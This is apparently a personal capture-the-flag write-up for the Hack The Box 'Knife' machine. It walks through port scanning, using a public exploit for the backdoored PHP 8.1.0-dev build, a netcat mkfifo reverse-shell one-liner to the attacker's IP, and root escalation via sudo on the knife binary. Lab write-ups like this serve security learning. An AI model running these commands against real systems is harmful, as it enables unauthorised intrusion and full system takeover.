---
tags: 
group: Linux
---
![](https://labs.hackthebox.com/storage/avatars/110fe6608793064cf171080150ebd0dc.png)

- Machine : https://app.hackthebox.com/machines/Knife
- Reference : https://0xdf.gitlab.io/2021/08/28/htb-knife.html
- Solved : 2025.3.21. (Fri) (Takes 1day)

## Summary
---

1. **Initial Enumeration**
    - **Open Ports**: 22 (SSH), 80 (HTTP)
    - **Services Identified**:
        - SSH: OpenSSH 8.2p1
        - HTTP: Apache 2.4.41 (Ubuntu), PHP/8.1.0-dev
    - **Tools Used**:
        - `nmap` – Full service enumeration
        - `nikto` – Found PHP 8.1.0-dev (development version)
    
2. **Web Exploitation**
    - **PHP 8.1.0-dev RCE Exploit**:
        - ExploitDB ID: `49933.py` – RCE via `User-Agentt` header
        - Gained **initial shell as `james`**
    
3. **Shell as `james`**
    - **Upgraded Shell**:
        - Reverse shell using `nc`, then upgraded with `pty.spawn("/bin/bash")`
    - **Privilege Enumeration**:
        - `sudo -l` revealed password-less access to `/usr/bin/knife`
    
4. **Privilege Escalation to `root`**
    - **GTFOBins Technique**:
        - Command: `sudo /usr/bin/knife exec -E 'exec "/bin/sh"'`
        - Escalated to **root shell successfully**

### Key Techniques:

- **Service Enumeration**: `nmap`, `nikto`
- **Known Exploit Usage**: PHP 8.1.0-dev RCE
- **Shell Upgrade**: Reverse shell with `nc` and Python pty
- **Privilege Escalation**: GTFOBins sudo abuse via `knife` exec

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb/knife]
└─$ /opt/custom-scripts/port-scan.sh 10.10.10.242
Performing quick port scan on 10.10.10.242...
Found open ports: 22,80
Performing detailed scan on 10.10.10.242...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 01:32 MDT
Nmap scan report for 10.10.10.242
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.46 seconds
```

### http(80)

![](attachments/knife_1.png)

The "EMA" stands for "Emergent Medical Idea". It seems to be related with medical, and hospital systems.

Let's run `nikto` to scan the webserver.

```bash
┌──(kali㉿kali)-[~/htb/knife]
└─$ nikto -h http://10.10.10.242
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.10.242
+ Target Hostname:    10.10.10.242
+ Target Port:        80
+ Start Time:         2025-03-21 01:38:05 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: Retrieved x-powered-by header: PHP/8.1.0-dev.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
```

It says the PHP version is `8.1.0-dev` which is quite outdated.



# Shell as `james`

### PHP 8.1.0-dev backdoor

```bash
┌──(kali㉿kali)-[~/htb/knife]
└─$ searchsploit -e "php 8.1.0-dev"
----------------------------------------------------- ---------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution  | php/webapps/49933.py
----------------------------------------------------- ---------------------------
Shellcodes: No Results
```

Luckily, I found an existing exploit exactly for that PHP version.
Here's a related article : https://amsghimire.medium.com/php-8-1-0-dev-backdoor-cb224e7f5914

I copied the exploit using `searchsploit -m`.

```bash
┌──(kali㉿kali)-[~/htb/knife]
└─$ searchsploit -m php/webapps/49933.py
  Exploit: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49933
     Path: /usr/share/exploitdb/exploits/php/webapps/49933.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/knife/49933.py
```

Using this exploit, I can easily obtain a shell.

```shell
┌──(kali㉿kali)-[~/htb/knife]
└─$ python 49933.py                                                   
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ whoami
james
```



# Shell as `root`

### Upgrade shell

Current shell is implicitly sending HTTP request with `user-agentt` header every time.
Let's upgrade the shell to fully interactive one.

```shell
┌──(kali㉿kali)-[~/htb/knife]
└─$ python 49933.py
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 9001 >/tmp/f
```

```bash
┌──(kali㉿kali)-[~/htb/knife]
└─$ nc -nlvp 9001          
listening on [any] 9001 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.242] 42436
/bin/sh: 0: can't access tty; job control turned off
$ python3 --version
Python 3.8.5
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
james@knife:/$
```

### Enumeration

I first checked sudo permission and there is one command can be run as `root`.

```bash
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

### Exploit `knife` with `sudo` permission

I found it from "GTFOBins" that I can escalate privileges using `knife` binary with the following command line :

```bash
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```

Let's try it.

```bash
james@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

I got `root` shell!